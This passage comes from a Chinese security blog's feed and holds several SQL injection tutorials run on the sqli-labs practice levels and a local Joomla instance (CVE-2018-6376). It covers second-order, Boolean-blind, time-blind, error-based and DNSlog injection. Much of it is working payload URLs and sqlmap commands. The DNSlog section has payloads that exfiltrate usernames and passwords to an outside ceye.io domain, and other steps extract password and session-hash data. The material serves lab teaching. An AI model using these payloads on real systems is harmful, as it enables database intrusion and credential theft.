<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Validating the user input........</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//$username=  $_POST['username'] ;</span></span><br><span class="line">	$username=  mysql_escape_string($_POST[<span class="string">'username'</span>]) ;</span><br><span class="line">	$pass= mysql_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">	$re_pass= mysql_escape_string($_POST[<span class="string">'re_password'</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;font size='3' color='#FFFF00'&gt;"</span>;</span><br><span class="line">	$sql = <span class="string">"select count(*) from users where username='$username'"</span>;</span><br><span class="line">	$res = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'You tried to be smart, Try harder!!!! :( '</span>);</span><br><span class="line">  	$row = mysql_fetch_row($res);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//print_r($row);</span></span><br><span class="line">	<span class="keyword">if</span> (!$row[<span class="number">0</span>]== <span class="number">0</span>) </span><br><span class="line">		&#123;</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">		&lt;script&gt;alert(<span class="string">"The username Already exists, Please choose a different username "</span>)&lt;/script&gt;;</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">		header(<span class="string">'refresh:1, url=new_user.php'</span>);</span><br><span class="line">   		&#125; </span><br><span class="line">		<span class="keyword">else</span> </span><br><span class="line">		&#123;</span><br><span class="line">       		<span class="keyword">if</span> ($pass==$re_pass)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment"># Building up the query........</span></span><br><span class="line">   				</span><br><span class="line">   				$sql = <span class="string">"insert into users ( username, password) values(\"$username\", \"$pass\")"</span>;</span><br><span class="line">   				mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Error Creating your user account,  : '</span>.mysql_error());</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;img src=../images/Less-24-user-created.jpg&gt;&lt;font size='3' color='#FFFF00'&gt;"</span>;   				</span><br><span class="line">					<span class="comment">//echo "&lt;h1&gt;User Created Successfully&lt;/h1&gt;";</span></span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;					</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Redirecting you to login page in 5 sec................"</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;font size='2'&gt;"</span>;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;If it does not redirect, click the home button on top right&lt;/center&gt;"</span>;</span><br><span class="line">					header(<span class="string">'refresh:5, url=index.php'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			<span class="meta">?&gt;</span></span><br><span class="line">			&lt;script&gt;alert(<span class="string">'Please make sure that password field and retype password match correctly'</span>)&lt;/script&gt;</span><br><span class="line">			<span class="meta">&lt;?php</span></span><br><span class="line">			header(<span class="string">'refresh:1, url=new_user.php'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>userlist.php代码如下，加入到sqli-labs-24关中去，目的是显示用户列表</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users ORDER BY id asc"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$num=mysql_num_rows($result);</span><br><span class="line"><span class="keyword">for</span> ($j=<span class="number">0</span>; $j&lt;$num; ++$j)</span><br><span class="line">&#123;</span><br><span class="line">	$row=mysql_fetch_array($result);</span><br><span class="line">	$username=$row[<span class="number">1</span>];</span><br><span class="line">	$sql_detail=<span class="string">"SELECT * FROM users WHERE username='$username'"</span>;</span><br><span class="line">	$result_detail=mysql_query($sql_detail);</span><br><span class="line">	$num_detail=mysql_num_rows($result_detail);</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;$num_detail; ++$i)</span><br><span class="line">	&#123;</span><br><span class="line">	$row_detail=mysql_fetch_array($result_detail);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;END</span></span><br><span class="line"><span class="string">	&lt;table border="1" style="table-layout:fixd;" width="1000"&gt;</span></span><br><span class="line"><span class="string">		 &lt;tr&gt;</span></span><br><span class="line"><span class="string">		    &lt;th&gt;<span class="subst">$row_detail</span>[1]&lt;/th&gt;</span></span><br><span class="line"><span class="string">		    &lt;th&gt;<span class="subst">$row_detail</span>[2]&lt;/th&gt;</span></span><br><span class="line"><span class="string">		 &lt;/tr&gt;</span></span><br><span class="line"><span class="string">	&lt;/table&gt;</span></span><br><span class="line"><span class="string">END;</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="黑盒测试-2"><a href="#黑盒测试-2" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>在注入后键入<code>%2527</code>，然后按照正常的注入流程开始注入</p>
<p>先修改sqli-labs的数据库，如下</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-7-1.png" alt="mysql-7-1"></p>
<p>创建用户<code>1&#39; union select 1,user(),3#</code></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-8.png" alt="mysql-8"></p>
<p>创建成功后发现当前用户<code>root@localhost</code>，原理为根据userlist.php代码得知，拼接后为<code>SELECT * FROM users WHERE username=&#39;1&#39; union select 1,user(),3#&#39;</code>，根据<code>$row_detail[1]</code>可显示<code>select user()</code>数据</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-9.png" alt="mysql-9"></p>
<p>同理创建<code>1&#39; union select 1,(select concat_ws(0x7e,username,password) from security.users limit 0,1),3#</code>用户</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-10.png" alt="mysql-10"></p>
<p>访问userlist.php可成功获得账户Dumb，密码0</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-11.png" alt="mysql-11"></p>
<h3 id="白盒测试-2"><a href="#白盒测试-2" class="headerlink" title="白盒测试"></a>白盒测试</h3><ul>
<li>严格对待外部提交数据</li>
<li>程序内部的数据调用，也要严格进行检查</li>
</ul>
<h3 id="sqlmap二阶注入"><a href="#sqlmap二阶注入" class="headerlink" title="sqlmap二阶注入"></a>sqlmap二阶注入</h3><p>上述sqli-labs-24关使用sqlmap注入无果，采用CVE-2018-6376 – Joomla来演示sqlmap的二阶适用方法，创建Joomla站点，如下所示</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-12.png" alt="mysql-12"></p>
<p>创建hahah用户，权限为Manager</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-13.png" alt="mysql-13"></p>
<p>Hahah用户登陆，尝试获取root用户权限</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-14.png" alt="mysql-14"></p>
<p> 编辑用户信息处，保存后抓包</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-15.png" alt="mysql-15"></p>
<p>抓包后在<code>[admin_style]</code>后加<code>[0]</code>，加入内容为<code>extractvalue(0x0a,concat(0x0a,(select database())))</code></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-16.png" alt="mysql-16"></p>
<p>刷新<code>http://192.168.64.2/Joomla/administrator/index.php</code>页面，注入出数据库为<code>hah</code></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-17.png" alt="mysql-17"></p>
<p>修改内容为<code>extractvalue(0x0a,concat(0x0a,(select session_id from dc8ny_session where username=&#39;root&#39;)))</code></p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-18.png" alt="mysql-18"></p>
<p>刷新<code>http://192.168.64.2/Joomla/administrator/index.php</code>页面，注入出用户哈希值</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-19.png" alt="mysql-19"></p>
<p>尝试sqlmap注入，上述内容抓包后保存为1.txt内容修改为<code>extractvalue(0x0a,concat(0x0a,(select @@version where 1=1 \*)))</code>，*处为了可以正确插入sqlmap的payload进行判断</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-20.png" alt="mysql-20"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2 sqlmap.py -r <span class="number">1.</span>txt --second-url <span class="string">"http://192.168.64.2/Joomla/administrator/index.php"</span></span><br></pre></td></tr></table></figure>

<p>sqlmap成功注入</p>
<p><img src="//choge.top/2020/01/26/Mysql注入之宽字节注入、二次编码注入、二次注入/mysql-21.png" alt="mysql-21"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>网易云</p>
<p><a href="https://www.freebuf.com/articles/web/162822.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/162822.html</a></p>
]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql注入之盲注</title>
    <url>/2020/01/17/Mysql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>本文主要总结Mysql下盲注技术</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息，只返回”Right”与”Wrong”，这里可以构造语句，来判断数据库语句的正确性，通过页面的“真”和“假”来识别我们的判断是否正确，“真”和“假”可以从返回页面，数据包长度，返回码等信息判断</p><h3 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h3><a id="more"></a>

<table>
<thead>
<tr>
<th align="center">方法</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">left()函数</td>
<td align="center">left(database(),1)&gt;’s’                                                                                                      database()显示数据库名称，left(a,b)从左侧截取a的前b位</td>
</tr>
<tr>
<td align="center">regexp</td>
<td align="center">select user() regex ‘^r’                                                                                                                正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式</td>
</tr>
<tr>
<td align="center">like</td>
<td align="center">select user() like ‘ro%’                                                                                                                与regexp相似，使用like进行匹配</td>
</tr>
<tr>
<td align="center">substr()函数                       ascii()函数</td>
<td align="center">ascii(substr((select database()),1,1))=98        substr(a,b,c)从b位置开始，截取字符串a的长度，ascii()将某个字符转换为ascii值</td>
</tr>
<tr>
<td align="center">ord()函数             mid()函数</td>
<td align="center">ord(mid((select user()),1,1))=114  mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii()，将字符转换为ascii值</td>
</tr>
</tbody></table>
<h3 id="布尔盲注实战"><a href="#布尔盲注实战" class="headerlink" title="布尔盲注实战"></a>布尔盲注实战</h3><p>布尔盲注实战以sqli_labxx关为实验环境</p>
<p>判断注入</p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39;</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-1.png" alt="mysql-1"></p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39;&#39;</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-2.png" alt="mysql-2"></p>
<h4 id="使用left判断"><a href="#使用left判断" class="headerlink" title="使用left判断"></a>使用left判断</h4><p>判断当前数据库第一个字符</p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39; --+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-4.png" alt="mysql-4"></p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39; --+</code>判断第一张表的第一个字符</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-5.png" alt="mysql-5"></p>
<p>抓包进入bp的intruder模块进行快速判断，设置如下</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-6.png" alt="mysql-6"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-7.png" alt="mysql-7"></p>
<p>快速跑出有效数据</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-8.png" alt="mysql-8"></p>
<p>判断第一张表的第二个字符</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-9.png" alt="mysql-9"></p>
<p>第二个字符为m，以此类推，跑出完整数据</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-10.png" alt="mysql-10"></p>
<p>判断第二张表的第一个字符</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-11.png" alt="mysql-11"></p>
<p>第二张表的第一个字符为r</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-13.png" alt="mysql-13"></p>
<p>判断第二张表的第二个字符</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-12.png" alt="mysql-12"></p>
<p>第二张表的第二个字符为e，以此类推，跑出所以数据</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-14.png" alt="mysql-14"></p>
<p>判断user表的第一个字段的第一个字符</p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1)=&#39;e&#39; --+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-15.png" alt="mysql-15"></p>
<p>设置如下</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-16.png" alt="mysql-16"></p>
<p>user表的第一个字段的第一个字符为i</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-17.png" alt="mysql-17"></p>
<p>user表的第一个字段的第二个字符为d</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-18.png" alt="mysql-18"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-19.png" alt="mysql-19"></p>
<h4 id="使用regexp判断"><a href="#使用regexp判断" class="headerlink" title="使用regexp判断"></a>使用regexp判断</h4><p><img src="/Users/c0cho/hexo/source/_posts/Mysql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/mysql-20.png" alt="mysql-20"></p>
<p>判断第一个表的第一个字符</p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) regexp &#39;^s&#39; --+</code></p>
<p>抓包使用bp设置如下</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-21.png" alt="mysql-21"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-22.png" alt="mysql-22"></p>
<p>第一张表的第一个字符为e</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-23.png" alt="mysql-23"></p>
<p>判断第一张表的第二个字符为m</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-24.png" alt="mysql-24"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-25.png" alt="mysql-25"></p>
<h4 id="使用like判断"><a href="#使用like判断" class="headerlink" title="使用like判断"></a>使用like判断</h4><p><code>http://127.0.0.1/Less-8/?id=1&#39; and (select table_name from information_schema.tables where table_schema=database() limit 0,1) like&#39;a%&#39; --+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-26.png" alt="mysql-26"></p>
<p>抓包和设置如下</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-28.png" alt="mysql-28"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-27.png" alt="mysql-27"></p>
<p>第一个表的第一个字符为e</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-29.png" alt="mysql-29"></p>
<p>第一个表的第二个字符为m</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-30.png" alt="mysql-30"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-31.png" alt="mysql-31"></p>
<p>以此类推跑出完整数据</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>代码存在sql注入漏洞，但页面即不会回显数据，也不会回显错误信息，语句执行也不提示真假，不能通过页面的内容来进行判断，这里可通过构造语句，通过页面响应的时长，来判断信息，即时间盲注。</p>
<h3 id="核心语法"><a href="#核心语法" class="headerlink" title="核心语法"></a>核心语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(left(user(),1)=&apos;a&apos;,0,sleep(3))    #(user(),1)=&apos;a&apos;处替换sql语句</span><br><span class="line">if(sascii(substr(database(),1,1))&gt;115,0,sleep(5))%23  #(database(),1,1)和115处为替换sql语句</span><br></pre></td></tr></table></figure>

<h4 id="使用sacii和substr判断"><a href="#使用sacii和substr判断" class="headerlink" title="使用sacii和substr判断"></a>使用sacii和substr判断</h4><p><code>http://127.0.0.1/Less-8/?id=1&#39; and ascii(substr((select database()),1,1))=115--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-32.png" alt="mysql-32"></p>
<p>ascii可使用python语法直接查询</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-33.png" alt="mysql-33"></p>
<p>也可以对照ascii查询</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-34.png" alt="mysql-34"></p>
<p>判断第一张表的第一个字符</p>
<p><code>http://127.0.0.1/Less-8/?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115--+</code></p>
<p>bp设置如下</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-35.png" alt="mysql-35"></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-36.png" alt="mysql-36"></p>
<p>第一个字符ascii为101为e</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-37.png" alt="mysql-37"></p>
<p>判断第一张表的第二个字符</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-38.png" alt="mysql-38"></p>
<p>第二个字符为m</p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-39.png" alt="mysql-39"></p>
<p>以此类推，跑出所以数据</p>
<h4 id="使用sleep判断"><a href="#使用sleep判断" class="headerlink" title="使用sleep判断"></a>使用sleep判断</h4><p>判断user表的第一个字符是否为a，是则执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;a&#39;,0,sleep(3))--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-40.png" alt="mysql-40"></p>
<p>判断user表的第一个d字段第一位否为r，是则不执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;r&#39;,0,sleep(3))--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-41.png" alt="mysql-41"></p>
<p>判断user表的第一个字段前两位是否为ro，是则不执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;ro&#39;,0,sleep(3))--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-42.png" alt="mysql-42"></p>
<p>判断user表的第一个字段前四位是否为ro，是则不执行3秒<code>http://127.0.0.1/Less-10/?id=1&quot; and if(left(user(),1)=&#39;root&#39;,0,sleep(3))--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-43.png" alt="mysql-43"></p>
<p>判断第一个表的第一个字符第一位是否为e，是则不执行3秒</p>
<p><code>http://127.0.0.1/Less-10/?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;,0,sleep(3))--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-44.png" alt="mysql-44"></p>
<p>判断第一个表的第一个字符第一位是否为em，是则不执行3秒</p>
<p><code>http://127.0.0.1/Less-10/?id=1&quot; and if(left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&#39;em&#39;,0,sleep(3))--+</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-45.png" alt="mysql-45"></p>
<p>以此类推，跑出所有数据</p>
<h2 id="DnsLog注入"><a href="#DnsLog注入" class="headerlink" title="DnsLog注入"></a>DnsLog注入</h2><p>代码存在SQL注入漏洞，但页面不会回显数据，也不会回显错误信息。此时可通过布尔或者时间盲注可以获取到内容，但整个过程效率低，需要发送多次请求进行判断，很可能会触发安全设备的防护。这时需要一种方式，减少请求。直接回显数据，这里可以使用DnsLog注入实现。</p>
<p>Dnslog 目标服务器是windows系统</p>
<h3 id="DnsLog注入平台"><a href="#DnsLog注入平台" class="headerlink" title="DnsLog注入平台"></a>DnsLog注入平台</h3><p><a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io/</a><br>DNS在解析的时候会留下日志，通过读取多级域名的解析日志，获取信息请求信息。</p>
<p>###构造语句</p>
<p>Mysql可构造语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))   #select database()处插入sql语句进行查询，mysql为自己个性化标识，进行分类判断</span><br></pre></td></tr></table></figure>

<p>系统执行<code>curl</code>whoami<code>.xxxx.cyce.io</code></p>
<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-46.png" alt="mysql-46"></p>
<p>Dnslog平台返回结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-48.png" alt="mysql-48"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1' and load_file(concat('\\\\',(<span class="keyword">select</span> <span class="keyword">concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="string">'.mysql.6gdl2p.ceye.io\\abc'</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-49.png" alt="mysql-49"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select concat_ws(&apos;A&apos;,username,password) from security.users limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-50.png" alt="mysql-50"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select concat_ws(&apos;～&apos;,username,password) from security.users limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>

<p>无返回，因为dnslog不能使用特殊字符，如要使用特殊字符分隔可以使用hex</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://192.168.16.123/sqli-labs-master/Less-9/?id=1&apos; and load_file(concat(&apos;\\\\&apos;,(select hex(concat_ws(&apos;~&apos;,username,password)) from security.users limit 0,1),&apos;.mysql.6gdl2p.ceye.io\\abc&apos;))--+</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/17/Mysql注入之盲注/mysql-51.png" alt="mysql-51"></p>
<p>44756D627E30经过hex decode后微Dumb~0</p>
<p>Mysql Dnslog注入条件：<a href="https://www.cnblogs.com/p0pl4r/p/10581070.html" target="_blank" rel="noopener">https://www.cnblogs.com/p0pl4r/p/10581070.html</a></p>
<h3 id="脚本执行Dnslog注入"><a href="#脚本执行Dnslog注入" class="headerlink" title="脚本执行Dnslog注入"></a>脚本执行Dnslog注入</h3><p>Python_poc：</p>
<p><a href="https://github.com/ADOOO/DnslogSqlinj" target="_blank" rel="noopener">https://github.com/ADOOO/DnslogSqlinj</a></p>
<p><a href="https://xz.aliyun.com/t/2359" target="_blank" rel="noopener">https://xz.aliyun.com/t/2359</a></p>
<p>Sqlmap：</p>
<p><a href="https://www.cnblogs.com/backlion/p/8984121.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/8984121.html</a></p>
<p>Dnslog对其他漏洞的使用：</p>
<p><a href="https://www.freebuf.com/column/184587.html" target="_blank" rel="noopener">https://www.freebuf.com/column/184587.html</a></p>
]]></content>
      <categories>
        <category>Sql injection</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql之union注入、报错注入</title>
    <url>/2020/01/16/Mysql%E4%B9%8Bunion%E6%B3%A8%E5%85%A5%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>本文主要讲解Mysql中的union注入和报错注入</p><h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><p>union操作符用于合并两个或多个select语句的结果集。注意，union内部的select语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条select语句中的列的顺序必须相同。默认情况，union操作符选取不同的值。如果允许重复的值，请使用union all。</p><a id="more"></a>

<h3 id="union注入条件"><a href="#union注入条件" class="headerlink" title="union注入条件"></a>union注入条件</h3><ul>
<li>只有最后一个select子句允许有order by</li>
<li>只有最后一个select子句允许有limit</li>
<li>只要union连接的几个查询字段数一样且列的数据类型转换没有问题，就可以查询出结果</li>
<li>注入点页面有回显</li>
</ul>
<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-1.png" alt="mysql-1"></p>
<p>具体注入方式参考本博文章Mysql注入基础</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入主要应用在查询不回显内容，但会打印错误信息，update、insert等语句会打印错误信息情况下</p>
<h3 id="常用payloads"><a href="#常用payloads" class="headerlink" title="常用payloads"></a>常用payloads</h3><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2))   #group by 对rand()函数进行操作时产生错误</span><br></pre></td></tr></table></figure>

<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extractvalue(1,concat(0x7e,(select user()),0x7e))  #XPATH语法错误产生报错</span><br></pre></td></tr></table></figure>

<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select updatexml(1,concat(0x7e,(select user()),0x7e),1)</span><br></pre></td></tr></table></figure>

<h3 id="报错注入实战"><a href="#报错注入实战" class="headerlink" title="报错注入实战"></a>报错注入实战</h3><p>环境使用sqli_lab第一关</p>
<h4 id="floor-实战"><a href="#floor-实战" class="headerlink" title="floor()实战"></a>floor()实战</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and (select count(*) from information_schema.tables group by concat((select user()),floor(rand(0)*2)))--+  #查库</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-2.png" alt="mysql-2"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/Less-1/?id=1&apos; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+  #优化显示</span><br></pre></td></tr></table></figure>

<p><img src="//choge.top/2020/01/16/Mysql之union注入、报错注入/mysql-3.png" alt="mysql-3"></p>
